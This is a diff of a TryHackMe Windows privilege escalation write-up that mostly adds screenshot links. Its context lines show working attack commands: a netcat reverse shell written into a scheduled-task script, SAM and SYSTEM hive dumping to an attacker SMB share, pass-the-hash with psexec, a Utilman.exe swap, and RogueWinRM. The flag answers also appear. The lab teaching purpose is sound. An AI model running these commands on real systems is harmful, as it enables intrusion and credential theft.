@@ -96,7 +96,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    schtasks /query /tn vulntask /fo list /v
    ```
 
-   QUICK TASK
+   ![Quick Task](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Task.png)
 
    Using `icacls` we can see the permission we have to modify this file. Looks like we can edit it.
 
@@ -104,7 +104,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    icacls C:\tasks\schtask.bat
    ```
    
-   QUICK PERMISSIONS
+   ![Quick Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Permissions.png)
 
    Now lets edit the bat file to execute our reverse shell.
 
@@ -112,7 +112,8 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    echo C:\Tools\nc64.exe -e cmd.exe 10.18.78.136 1337 > C:\tasks\schtask.bat
    ```
 
-   QUICK SCRIPT
+   ![Quick Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Script.png)
+
 
    Last thing to do, is set up our listener and run the task manually.
 
@@ -122,11 +123,11 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    schtasks /run /tn vulntask
    ```
    
-   QUICK REVERSE SHELL
+   ![Quick Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Reverse_Shell.png)
 
    Now we can navigate to the users desktop and read the flag.
 
-   QUICK FLAG
+   ![Quick Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{TASK_COMPLETED}</details>
 
@@ -292,8 +293,8 @@ In this task we will use three different methods to get adminstrator privileges.
    whoami /priv
    ```
 
-   WINDOWS PRIVS PRIVILEGES
-
+   ![Windows Privs Privileges](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges.png)
+   
    Now that we know we can read/write files we can copy the SYSTEM and SAM hives to our account folder.
 
    ```cmd
@@ -301,7 +302,7 @@ In this task we will use three different methods to get adminstrator privileges.
    reg save hklm\sam C:\Users\THMBackup\sam.hive
    ```
 
-   WINDOWS PRIVS COPY
+   ![Windows Privs Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Copy.png)
 
    Now we start a SMB server on our attack machine using `impacket` and transfer the files.
 
@@ -312,7 +313,7 @@ In this task we will use three different methods to get adminstrator privileges.
    copy system.hive \\10.18.78.136\public
    ```
 
-   WINDOWS PRIVS TRANSFERED
+   ![Windows Privs Transfered](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Transfered.png)
 
    Again using `impacket` we can now extract the administrators hash from these files.
 
@@ -320,7 +321,7 @@ In this task we will use three different methods to get adminstrator privileges.
    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
    ```
 
-   WINDOWS PRIVS HASH
+   ![Windows Privs Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Hash.png)
 
    With this hash we can perform a Pash the Hash attack on the target machine.
 
@@ -328,7 +329,7 @@ In this task we will use three different methods to get adminstrator privileges.
    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.8.101
    ```
 
-   WINDOWS PRIVS CONNECTION1
+   ![Windows Privs Connection1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection1.png)
 
    **SeTakeOwnership**
 
@@ -344,19 +345,20 @@ In this task we will use three different methods to get adminstrator privileges.
    copy cmd.exe Utilman.exe
    ```
 
-   WINDOWS PRIVS TAKE OWNERSHIP
+   ![Windows Privs Take Ownership](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Take_Ownership.png)
 
    Now we have successfully taken owners ship of utilman, gotten full permissions, and replaced it with 'cmd.exe`.
 
    Now we can lock the screen and access ease of accces, which will spawn a command shell instead.
 
-   WINDOWS PRIVS CONNECTION2
+   ![Windows Privs Connection2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection2.png)
 
    **SeImpersonate / SeAssignPrimaryToken**
 
    For this we abuse the webshell we currently have running whose user has these privileges set. Checking with `whoami /priv` should confirm this.
 
-   WINDOWS PRIVS PRIVILEGES 3
+   ![Windows Privs Privileges3](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges3.png)
+
 
    Next, we need to start a listener on our machine.
 
@@ -370,7 +372,7 @@ In this task we will use three different methods to get adminstrator privileges.
    C:\Tools\RogueWinRM\RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe 10.18.78.136 1337"
    ```
 
-   WINDOWS PRIVS CONNECITON 3
+   ![Windows Privs Connection3](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection3.png)
 
    ><details><summary>Click for answer</summary>THM{SEFLAGPRIVILEGE}</details>
    
